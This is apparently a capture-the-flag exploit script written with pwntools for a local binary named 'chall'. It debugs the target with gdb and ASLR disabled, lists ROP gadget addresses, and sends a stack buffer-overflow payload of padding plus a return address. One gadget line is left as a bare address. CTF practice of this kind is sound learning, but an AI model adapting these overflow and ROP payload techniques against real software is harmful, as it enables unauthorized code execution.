from pwn import *


binpath = './chall'
elf = ELF(binpath)
libc = elf.libc


context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']


gdbscript = '''
gef
b _start
# before return
b *0x40049a
'''
io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)


0x0000000000400498  # : dec ecx ; ret
addr_leave = 0x0000000000400499  # : leave ; ret
addr_r15 = 0x000000000040049b  # : pop r15 ; ret
addr_rbp = 0x000000000040047c  # : pop rbp ; ret
addr_rdi = 0x000000000040049c  # : pop rdi ; ret
addr_rsi = 0x000000000040049e  # : pop rsi ; ret
addr_ret = 0x000000000040047d  # : ret


buf = b''
buf += b'A' * 0x28
buf += p64(0x4003f0)
buf += p64(2)


io.sendline(buf)


io.interactive()
